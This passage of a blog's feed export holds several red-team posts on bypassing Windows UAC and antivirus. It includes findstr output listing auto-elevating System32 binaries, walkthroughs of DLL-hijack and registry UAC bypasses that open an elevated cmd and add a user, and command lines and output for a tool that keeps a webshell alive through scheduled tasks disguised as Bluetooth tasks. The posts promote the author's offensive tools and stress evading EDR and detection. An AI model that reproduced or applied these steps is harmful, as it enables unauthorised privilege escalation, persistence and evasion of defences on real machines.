class="token assign-left variable">xmlns</span><span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/SMI/2005/WindowsSettings"</span><span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>cliconfg.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>false<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>CompMgmtLauncher.exe:             <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>false<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>ComputerDefaults.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>dccw.exe:       <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>dcomcnfg.exe:           <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>DeviceEject.exe:             <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>DeviceProperties.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>dfrgui.exe:         <span class="token operator">&lt;</span>autoElevate  <span class="token assign-left variable">xmlns</span><span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/SMI/2005/WindowsSettings"</span><span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>djoin.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>easinvoker.exe:       <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>EASPolicyManagerBrokerHost.exe:       <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>eudcedit.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>eventvwr.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>fodhelper.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>fsavailux.exe:         <span class="token operator">&lt;</span>autoElevate <span class="token assign-left variable">xmlns</span><span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/SMI/2005/WindowsSettings"</span><span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>fsquirt.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>FXSUNATD.exe:           <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>immersivetpmvscmgrsvr.exe:       <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>iscsicli.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>iscsicpl.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>lpksetup.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>MdSched.exe:             <span class="token operator">&lt;</span>autoElevate <span class="token assign-left variable">xmlns</span><span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/SMI/2005/WindowsSettings"</span><span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>MSchedExe.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>msconfig.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>msdt.exe:       <span class="token operator">&lt;</span>autoElevate <span class="token assign-left variable">xmlns</span><span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/SMI/2005/WindowsSettings"</span><span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>msra.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>MultiDigiMon.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>Netplwiz.exe:         <span class="token operator">&lt;</span>autoElevate  <span class="token assign-left variable">xmlns</span><span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/SMI/2005/WindowsSettings"</span><span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>newdev.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>odbcad32.exe:             <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>OptionalFeatures.exe:         <span class="token operator">&lt;</span>autoElevate  <span class="token assign-left variable">xmlns</span><span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/SMI/2005/WindowsSettings"</span><span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>PasswordOnWakeSettingFlyout.exe:          <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>perfmon.exe: <span class="token operator">&lt;</span>autoElevate <span class="token assign-left variable">xmlns</span><span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/SMI/2005/WindowsSettings"</span><span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>printui.exe:             <span class="token operator">&lt;</span>autoElevate  <span class="token assign-left variable">xmlns</span><span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/SMI/2005/WindowsSettings"</span><span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>pwcreator.exe:             <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>rdpshell.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>recdisc.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>rrinstaller.exe:             <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>rstrui.exe:         <span class="token operator">&lt;</span>autoElevate  <span class="token assign-left variable">xmlns</span><span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/SMI/2005/WindowsSettings"</span><span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>sdclt.exe:         <span class="token operator">&lt;</span>autoElevate  <span class="token assign-left variable">xmlns</span><span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/SMI/2005/WindowsSettings"</span><span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>FINDSTR: 行 <span class="token number">3165251</span> 太长。FINDSTR: 行 <span class="token number">3165251</span> 太长。FINDSTR: 行 <span class="token number">3165251</span> 太长。FINDSTR: 行 <span class="token number">3165251</span> 太长。FINDSTR: 行 <span class="token number">3165251</span> 太长。FINDSTR: 行 <span class="token number">3165251</span> 太长。C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>shrpubw.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>slui.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>SndVol.exe:             <span class="token operator">&lt;</span>autoElevate <span class="token assign-left variable">xmlns</span><span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/SMI/2005/WindowsSettings"</span><span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>SystemPropertiesAdvanced.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>SystemPropertiesComputerName.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>SystemPropertiesDataExecutionPrevention.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>SystemPropertiesHardware.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>SystemPropertiesPerformance.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>SystemPropertiesProtection.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>SystemPropertiesRemote.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>systemreset.exe:             <span class="token operator">&lt;</span>autoElevate  <span class="token assign-left variable">xmlns</span><span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/SMI/2005/WindowsSettings"</span><span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>SystemSettingsAdminFlows.exe:          <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>SystemSettingsRemoveDevice.exe:          <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>Taskmgr.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>tcmsetup.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>TpmInit.exe:             <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>WindowsUpdateElevatedInstaller.exe:          <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>wusa.exe:             <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>Sysprep<span class="token punctuation">\</span>sysprep.exe:       <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>进步再手动寻找不触发uac弹窗的程序即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="关于manifest"><a href="#关于manifest" class="headerlink" title="关于manifest"></a>关于manifest</h3><pre class="line-numbers language-none"><code class="language-none">本质为XML文件，用于表示当前应用程序的配置属性<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="关于requestedExecutionLevel"><a href="#关于requestedExecutionLevel" class="headerlink" title="关于requestedExecutionLevel"></a>关于requestedExecutionLevel</h3><pre class="line-numbers language-none"><code class="language-none">asInvoker：默认权限，运行权限与父进程相同requireAdministrator：管理员权限运行highestAvailable：当前用户能获取到的最高权限运行，是管理员账户则会要求权限提升并弹UAC窗，普通用户则按照该账户的最高权限运行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Use%20Basic%20Way%20To%20BypassUAC/image-20211008151340378.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Use%20Basic%20Way%20To%20BypassUAC/image-20211008155507512.png"></p><h3 id="通过先前寻找的白名单程序，进步查看权限"><a href="#通过先前寻找的白名单程序，进步查看权限" class="headerlink" title="通过先前寻找的白名单程序，进步查看权限"></a>通过先前寻找的白名单程序，进步查看权限</h3><pre class="line-numbers language-none"><code class="language-none">如下运行后powershell权限如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Use%20Basic%20Way%20To%20BypassUAC/image-20211008160107340.png"></p><pre class="line-numbers language-none"><code class="language-none">调用后不是powershell权限，并没有继承父进程<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Use%20Basic%20Way%20To%20BypassUAC/image-20211008160301719.png"></p><pre class="line-numbers language-none"><code class="language-none">那么也就是说如果Netplwiz存在相关dll劫持，或能够修改注册表实现命令执行，则能够绕过uac，从而高权限执行代码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="手动尝试中的绕过发现"><a href="#手动尝试中的绕过发现" class="headerlink" title="手动尝试中的绕过发现"></a>手动尝试中的绕过发现</h4><pre class="line-numbers language-none"><code class="language-none">一张图简单易懂<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Use%20Basic%20Way%20To%20BypassUAC/image-20211008160828019.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
            <tag> UAC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Use DLL Hijack To BypassUAC(BypassAV)</title>
      <link href="2021/10/09/use-dll-hijack-to-bypassuac/"/>
      <url>2021/10/09/use-dll-hijack-to-bypassuac/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">My main idea:Hijack the implementation based on the whitelist DLL, thereby bypassuacAfter a simple test, two methods win10, Win11 can be successfully usedYou can go to my github to find the tools:https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;YangsirRedTeamTools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><pre class="line-numbers language-none"><code class="language-none">Find a program with autoElevate properties and DLL hijacking defectsConfirm hijackable DLLWriting malicious DLLHere, we tried to find the DLL under System32, but found that our DLL can not be written into the system32 directory, so we removed the application, and then looked for the DLL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Use%20DLL%20Hijack%20To%20BypassUAC/1.png"></p><pre class="line-numbers language-none"><code class="language-none">Through practice can easily find some DLL hijacking whitelist programsProgress using DLL hijacking, writing malicious DLLS, thus triggering pop-ups, execute CMD with high privileges so as to bypass UACIn order to resist detection, ensure long-term availability, the source part is not open source, I believe that you have a certain experience, of course, it is also very simple to reproduce my way of using<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Use%20DLL%20Hijack%20To%20BypassUAC/image-20211009131805909.png"></p><pre class="line-numbers language-none"><code class="language-none">Clean up after you&#39;re done，Using the clean program<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Use%20DLL%20Hijack%20To%20BypassUAC/image-20211009131855888.png"></p><pre class="line-numbers language-none"><code class="language-none">The second method is the same with DLL hijacking, but in a different whitelist implementation<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Use%20DLL%20Hijack%20To%20BypassUAC/image-20211009143909641.png"></p><pre class="line-numbers language-none"><code class="language-none">bypass the win10 defender<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Use%20DLL%20Hijack%20To%20BypassUAC/bypass.gif"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
            <tag> UAC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Use The Registry To Bypassuac(BypassAV)</title>
      <link href="2021/09/27/use-the-registry-to-bypassuac-bypassav/"/>
      <url>2021/09/27/use-the-registry-to-bypassuac-bypassav/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">Yesterday, the program can to bypassAV OR EDR, in this program I use the registry to bypassuac, now I use six plans to exec in win10 maybe can use in win7(I don&#39;t have win7 machine to test). So the program must be modify your registry. Second, I&#39;m not sure your computer mustbe success, if you have more advice please tell me.More personal tools you can go to my github:https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;YangsirRedTeamTools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><pre class="line-numbers language-none"><code class="language-none">VT scan like this:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Use%20The%20Registry%20To%20Bypassuac(BypassAV)/1.png"></p><pre class="line-numbers language-none"><code class="language-none">Bypass chineseEDR to bypassuac open cmd.exe, then add user like this:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Use%20The%20Registry%20To%20Bypassuac(BypassAV)/2.png"></p><pre class="line-numbers language-none"><code class="language-none">Such as, other plan also can be success:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Use%20The%20Registry%20To%20Bypassuac(BypassAV)/3.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
            <tag> UAC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Add A Scheduled Task BypassAV（WEBSHELL）</title>
      <link href="2021/09/20/add-a-scheduled-task-bypassav-webshell/"/>
      <url>2021/09/20/add-a-scheduled-task-bypassav-webshell/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">After Windows machine obtains target Webshell in red team task, progress maintains permissions through scheduled task, so as to avoid shell being deleted by defenseMore personal tools you can go to my github:https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;YangsirRedTeamTools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Actual-Use"><a href="#Actual-Use" class="headerlink" title="Actual Use"></a>Actual Use</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Very easy you must be know how to use, you can like this to <span class="token function">add</span> a plan to backup your webshell:C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>y<span class="token operator">></span>15x32.exeUsage: + your <span class="token function">tar</span> exe + Which plan  Such as:<span class="token number">15</span>.exe C:<span class="token punctuation">\</span>WWW<span class="token punctuation">\</span><span class="token number">1</span>.php AA:1m exec、B:30m exec、C:3h <span class="token builtin class-name">exec</span>C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>y<span class="token operator">></span>15x32.exe C:<span class="token punctuation">\</span>phpstudyWWW<span class="token punctuation">\</span>shell.phpUsage: + your <span class="token function">tar</span> exe + Which plan  Such as:<span class="token number">15</span>.exe C:<span class="token punctuation">\</span>WWW<span class="token punctuation">\</span><span class="token number">1</span>.php AA:1m exec、B:30m exec、C:3h <span class="token builtin class-name">exec</span>C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>y<span class="token operator">></span>15x32.exe C:<span class="token punctuation">\</span>phpstudyWWW<span class="token punctuation">\</span>shell.php AYourTaskname:ReinstallDeviceTask  YourTaskPath:<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>BluetoothYourTask Success<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>  YourTempDir:C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Public<span class="token punctuation">\</span>Downloads<span class="token punctuation">\</span>temp.txtC:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>y<span class="token operator">></span>15x32.exe C:<span class="token punctuation">\</span>phpstudyWWW<span class="token punctuation">\</span>shell.php BYourTaskname:ReinstallDeviceTasks  YourTaskPath:<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>BluetoothYourTask Success<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>  YourTempDir:C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Temp<span class="token punctuation">\</span>updatetemp.txtC:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>y<span class="token operator">></span>15x32.exe C:<span class="token punctuation">\</span>phpstudyWWW<span class="token punctuation">\</span>shell.php CYourTaskname:AutoReinstallDeviceTask  YourTaskPath:<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>BluetoothYourTask Success<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>  YourTempDir:C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Temp<span class="token punctuation">\</span>oldtemp.txtC:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>y<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Add%20A%20Scheduled%20Task%20BypassAV%EF%BC%88WEBSHELL%EF%BC%89/image-20210920145033771.png"></p><pre class="line-numbers language-none"><code class="language-none">Manually execute to confirm program availability&amp;BypassAV<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img 